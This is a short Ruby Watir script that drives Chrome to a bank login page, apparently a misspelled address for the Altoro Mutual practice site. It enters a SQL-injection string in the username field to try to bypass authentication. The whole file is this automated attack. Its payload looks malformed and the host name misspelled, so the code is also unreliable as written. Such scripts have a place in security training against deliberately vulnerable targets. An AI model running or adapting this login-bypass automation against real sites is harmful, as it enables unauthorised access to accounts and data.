#!/usr/bin/env ruby

require 'watir'

browser = Watir::Browser.new :chrome
browser.window.resize_to(800, 600)
browser.window.move_to(0, 0)
browser.goto "http://www.altoromtual.com/bank/login.aspx"
browser.text_field(name: 'uid').set("' 1=1;--")
browser.text_field(name: 'passw').set("password")
btn = browser.button(name: 'btnSubmit').click

#browser.close
